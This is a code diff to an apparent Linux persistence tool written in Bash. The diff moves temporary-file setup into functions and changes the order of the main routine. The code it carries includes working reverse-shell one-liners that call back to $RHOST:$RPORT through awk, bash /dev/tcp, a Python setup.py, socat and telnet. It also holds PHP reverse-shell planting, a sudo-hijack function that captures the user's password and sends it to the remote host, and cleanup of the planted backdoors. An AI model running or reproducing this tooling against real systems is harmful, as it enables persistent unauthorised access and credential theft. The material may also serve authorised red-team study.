@@ -186,36 +186,56 @@ stealth_modifications() {
 
 }
 
-echo -e "\e[92m[+]\e[0m Searching for writable directory to store temporary files"
-if [ -z ${WRITABLE_DIR+x} ];
-then
-    export WRITABLE_DIR=$(find /dev/shm /var/tmp /tmp -type d -writable 2> /dev/null | grep --color=never -o -e '^/dev/shm$' -e '^/var/tmp$' -e '^/tmp$' | head -n 1)
-else
-    if [ $WRITABLE_DIR = "." ];
+find_writable() {
+
+    echo -e "\e[92m[+]\e[0m Searching for writable directory to store temporary files"
+    if [ -z ${WRITABLE_DIR+x} ];
     then
-	export WRITABLE_DIR=$(pwd)
+	export WRITABLE_DIR=$(find /dev/shm /var/tmp /tmp -type d -writable 2> /dev/null | grep --color=never -o -e '^/dev/shm$' -e '^/var/tmp$' -e '^/tmp$' | head -n 1)
+    else
+	if [ $WRITABLE_DIR = "." ];
+	then
+	    export WRITABLE_DIR=$(pwd)
+	fi
+	export WRITABLE_DIR=$(find $WRITABLE_DIR -type d -writable 2> /dev/null | head -n 1)
     fi
-    export WRITABLE_DIR=$(find $WRITABLE_DIR -type d -writable 2> /dev/null | head -n 1)
-fi
 
-TMPTEST=$WRITABLE_DIR/$(uuidgen)
+    TMPTEST=$WRITABLE_DIR/$(uuidgen)
 
-(touch $TMPTEST && $REMOVALTOOL $TMPTEST) 2> /dev/null || (echo -e "\e[91m[-]\e[0m Error: Could not find a writable directory for temporary files" && echo -e "\e[93m[!]\e[0m Action: You can force one with -w, --writable-dir" && echo -e "\e[91m[-]\e[0m Killing Process" && kill -9 $$)
+    (touch $TMPTEST && $REMOVALTOOL $TMPTEST) 2> /dev/null || (echo -e "\e[91m[-]\e[0m Error: Could not find a writable directory for temporary files" && echo -e "\e[93m[!]\e[0m Action: You can force one with -w, --writable-dir" && echo -e "\e[91m[-]\e[0m Killing Process" && kill -9 $$)
 
-echo -e "\e[92m[+]\e[0m Choosing $WRITABLE_DIR"
-export TMPCRON=$(echo $WRITABLE_DIR/$(uuidgen))
-export TMPCRONWITHPAYLOAD=$(echo $WRITABLE_DIR/$(uuidgen))
-export TMPJJSFILE=$(echo $WRITABLE_DIR/$(uuidgen))
-export SUDOPASSWORDFILE=$(echo $WRITABLE_DIR/$(uuidgen))
-export TMPRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen))
-export TMPGOFILE=$(echo $WRITABLE_DIR/$(uuidgen).go)
-export PIPDIR=$(echo $WRITABLE_DIR/$(uuidgen))
-export PIP3DIR=$(echo $WRITABLE_DIR/$(uuidgen))
-export EASYINSTALLDIR=$(echo $WRITABLE_DIR/$(uuidgen))
-echo "-----------------------"
+    echo -e "\e[92m[+]\e[0m Choosing $WRITABLE_DIR"
+    echo "-----------------------"
+    export TMPCRON=$(echo $WRITABLE_DIR/$(uuidgen))
+    export TMPCRONWITHPAYLOAD=$(echo $WRITABLE_DIR/$(uuidgen))
+    export TMPJJSFILE=$(echo $WRITABLE_DIR/$(uuidgen))
+    export SUDOPASSWORDFILE=$(echo $WRITABLE_DIR/$(uuidgen))
+    export TMPRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen))
+    export TMPGOFILE=$(echo $WRITABLE_DIR/$(uuidgen).go)
+    export PIPDIR=$(echo $WRITABLE_DIR/$(uuidgen))
+    export PIP3DIR=$(echo $WRITABLE_DIR/$(uuidgen))
+    export EASYINSTALLDIR=$(echo $WRITABLE_DIR/$(uuidgen))
 
+}
 
-METHODS=(
+remove_writable() {
+    
+    $REMOVALTOOL $TMPCRON 2> /dev/null
+    $REMOVALTOOL $TMPCRONWITHPAYLOAD 2> /dev/null
+    $REMOVALTOOL $TMPJJSFILE 2> /dev/null
+    $REMOVALTOOL $SUDOPASSWORDFILE 2> /dev/null
+    $REMOVALTOOL $TMPRCLOCAL 2> /dev/null
+    $REMOVALTOOL $TMPGOFILE 2> /dev/null
+    $REMOVALTOOL -r $PIPDIR 2> /dev/null
+    $REMOVALTOOL -r $PIP3DIR 2> /dev/null
+    $REMOVALTOOL -r $EASYINSTALLDIR 2> /dev/null
+    echo -e "\e[92m[+]\e[0m Removed Temporary Files"
+
+}
+
+set_methods(){
+
+    export METHODS=(
     "awk , awk --version , awk 'BEGIN {s = \\\"/inet/tcp/0/$RHOST/$RPORT\\\"; while(42) { do{ printf \\\"shell>\\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \\\$0 |& s; close(c); } } while(c != \\\"exit\\\") close(s); }}' /dev/null?"
     "bash , bash -c 'exit' , bash -c 'bash -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'?"
     "easy_install , mkdir $EASYINSTALLDIR && echo 'import sys,socket,os,pty;exit()' > $EASYINSTALLDIR/setup.py; easy_install $EASYINSTALLDIR 2> /dev/null &> /dev/null , mkdir $EASYINSTALLDIR; echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$RHOST\\\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"$SHELL\\\",\\\"-i\\\"]);' > $EASYINSTALLDIR/setup.py; easy_install $EASYINSTALLDIR?"
@@ -244,6 +264,8 @@ METHODS=(
     "socat , socat tcp-listen:$RANDOMPORT STDOUT & echo exit | socat -t 1 STDIN tcp-connect:0.0.0.0:$RANDOMPORT , socat tcp-connect:$RHOST:$RPORT exec:$SHELL,pty,stderr,setsid,sigint,sane?"
     "telnet , echo quit | telnet , TELNETNAMEDPIPE=\\\$(echo $WRITABLE_DIR/$(uuidgen);mkfifo \\\$TELNETNAMEDPIPE && telnet $RHOST $RPORT 2> /dev/null 0<\\\$TELNETNAMEDPIPE | $SHELL 1>\\\$TELNETNAMEDPIPE 2> /dev/null & sleep .0001 #?"
 )
+
+}
 
 enum_methods() {
 
@@ -348,7 +370,7 @@ webserver_poison_attack() {
 			    echo $PAYLOAD > $i/$RANDOMPHPFILE && echo -e "\e[92m[+]\e[0m Persistence Installed: PHP Reverse Shell $i/$RANDOMPHPFILE" && COUNTER=$(expr $COUNTER + 1) && limit_checker $COUNTER
 			    IFS="?"
 			fi
-		    done	
+		    done
 		    unset IFS
 		fi
 	    done
@@ -362,6 +384,13 @@ sudo_hijack_attack() {
 
     if $(cat /etc/group | grep sudo | grep -qi $(whoami)) && $(which curl | grep -qi curl);
     then
+	TMPSUDOFILE=$(echo $WRITABLE_DIR/$(uuidgen))
+	timeout 1 sudo -l > $TMPSUDOFILE
+	if cat $TMPSUDOFILE | grep ALL | grep -q NOPASSWD;
+	then
+	    $REMOVALTOOL $TMPSUDOFILE
+	    return
+	fi
 	if [ "$DRYRUN" -eq 0 ];
 	then
 	    echo 'function sudo () { #linpersudo
@@ -378,8 +407,8 @@ sudo_hijack_attack() {
 	    echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access" &&
 	    echo "[+] Password will be Stored in $SUDOPASSWORDFILE" &&
 	    echo "[+] $SUDOPASSWORDFILE will be exfiltrated to https://$RHOST/ as a base64 encoded GET parameter"
-		else
-		    echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
+	else
+	    echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Possible"
 	fi
 	echo "-----------------------"
     fi
@@ -416,35 +445,35 @@ cleanup() {
     then
 	grep -v "#linpercrontab" ~/.bashrc > $TMPCLEANBASHRC &&
 	    cp $TMPCLEANBASHRC ~/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed crontab function from ~/.bashrc"
+	    echo -e "\e[92m[+]\e[0m Removed crontab function from $HOME/.bashrc"
     fi
 
     if $(grep -qi "#linpersudo" ~/.bashrc);
     then
 	grep -v "#linpersudo" ~/.bashrc > $TMPCLEANBASHRC &&
 	    cp $TMPCLEANBASHRC ~/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed sudo function from bashrc"
+	    echo -e "\e[92m[+]\e[0m Removed sudo function from $HOME/.bashrc"
     fi
 
     if $(grep -qi $1 ~/.bashrc);
     then
 	grep -v $1 ~/.bashrc > $TMPCLEANBASHRC &&
 	    cp $TMPCLEANBASHRC ~/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from ~/.bashrc"
+	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from $HOME/.bashrc"
     fi
 
     CRONBINARY=$(which crontab)
     if $($CRONBINARY -l 2> /dev/null | grep -q $1);
     then
 	$CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null 1>&2 && $CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null | $CRONBINARY || $CRONBINARY -r
-	echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from crontab spool"
+	echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /var/spool/crontab/$(whoami)"
     fi
 
     if $(grep -qi $1 /etc/crontab 2> /dev/null);
     then
 	grep -v $1 /etc/crontab > $TMPCLEANCRONTAB &&
-	mv $TMPCLEANCRONTAB /etc/crontab &&
-	echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/crontab"
+	    mv $TMPCLEANCRONTAB /etc/crontab &&
+	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/crontab"
     fi
 
     for i in $(find /etc/systemd/ -writable -type f 2> /dev/null);
@@ -467,7 +496,7 @@ cleanup() {
 
     if [ "$CLEANSYSMSG" -eq 1 ];
     then
-	echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from systemctl"
+	echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/sytemd/"
     fi
 
     if $(grep -q $1 /etc/rc.local 2> /dev/null);
@@ -483,12 +512,18 @@ cleanup() {
 
     if $(cat /etc/skel/.bashrc 2> /dev/null | grep -q $1);
     then
-	grep -v $1 /etc/skel/.bashrc > $TMPCLEANBASHRC
-	cp $TMPCLEANBASHRC /etc/skel/.bashrc
-	echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/skel/.bashrc"
+	grep -v $1 /etc/skel/.bashrc > $TMPCLEANBASHRC &&
+	    cp $TMPCLEANBASHRC /etc/skel/.bashrc &&
+	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/skel/.bashrc"
     fi
 
     cd $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') && grep -R --color=never "$1" . | awk -F: '{print $1}' | xargs $REMOVALTOOL 2> /dev/null &> /dev/null && echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}')/*"
+
+    $REMOVALTOOL $TMPCLEANBASHRC
+    $REMOVALTOOL $TMPCLEANBASHRC2
+    $REMOVALTOOL $TMPCLEANBASHRC3
+    $REMOVALTOOL $TMPCLEANRCLOCAL
+    $REMOVALTOOL $TMPCLEANCRONTAB
 
 }
 
@@ -505,6 +540,7 @@ main() {
 
     if [ "$CLEAN" -eq 1 ];
     then
+	find_writable
 	cleanup $RHOST
 	exit 0
     fi
@@ -515,15 +551,18 @@ main() {
 	exit 0
     fi
 
+    find_writable
+
+    sudo_hijack_attack $SUDOPASSWORDFILE
+    shadow
+    set_methods
     if [ "$STEALTHMODE" -eq 1 ];
     then
 	stealth_modifications
     fi
-
-    sudo_hijack_attack $SUDOPASSWORDFILE
-    shadow
     enum_methods
     webserver_poison_attack
+    remove_writable
     exit 0
 
 }
